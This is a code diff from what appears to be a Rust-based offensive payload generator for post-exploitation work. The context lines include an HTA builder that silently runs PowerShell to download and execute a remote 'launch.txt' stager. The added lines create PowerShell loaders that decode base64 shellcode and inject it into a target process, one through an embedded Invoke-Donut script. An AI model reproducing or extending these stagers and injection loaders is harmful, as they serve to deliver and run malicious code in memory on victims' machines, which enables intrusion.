@@ -13,6 +13,11 @@ pub fn get_invoke_reflective() -> String {
     format!("{}", String::from_utf8_lossy(invoke_shellcode))
 }
 
+pub fn get_invoke_donut() -> String {
+    let invoke_shellcode = include_bytes!("../assets/Invoke-Donut.ps1");
+    format!("{}", String::from_utf8_lossy(invoke_shellcode))
+}
+
 pub fn generate_hta(url: &str) -> String {
     format!("<html><head><script>var c='C:\\\\Windows\\\\SysNative\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -noP -sta -NoExit -w 1 \"ieX((iwr {}launch.txt -usEb).Content)\"';\
     new ActiveXObject('WScript.Shell').Run(c);</script></head><body><script>self.close();</script></body></html>", url)
@@ -49,6 +54,19 @@ pub fn shellcode_loader(invoker: &str, payload: &str) -> String {
 $sc = [Convert]::FromBase64String($sc)
 Invoke-Shellcode -Shellcode $sc"#;
     format!("{}{}{}{}", invoker, p1, payload, p2)
+}
+
+pub fn shellcode_process_inject_loader(invoker: &str, payload: &str, target_process: &str) -> String {
+    let p1 = "\n\n$sc = \"";
+    let p2 = "\"\n$sc = [Convert]::FromBase64String($sc)\n$target = (Get-Process | ? {$_.SI -eq (Get-Process -PID $PID).SessionId} | ? {$_.ProcessName -contains \"";
+    let p3 = "\"}).Id[0]\nInvoke-Shellcode -Shellcode $sc -ProcessID $target";
+    format!("{}{}{}{}{}{}", invoker, p1, payload, p2, target_process, p3)
+}
+
+pub fn donut_loader(invoker: &str, payload: &str, target_process: &str) -> String {
+    let p1 = "\n\n$sc = \"";
+    let p2 = "\"\nInvoke-Donut -ShellcodeB64 $sc -ProcessName ";
+    format!("{}{}{}{}{}", invoker, p1, payload, p2, target_process)
 }
 
 pub fn dll_loader(invoker: &str, payload: &str) -> String {
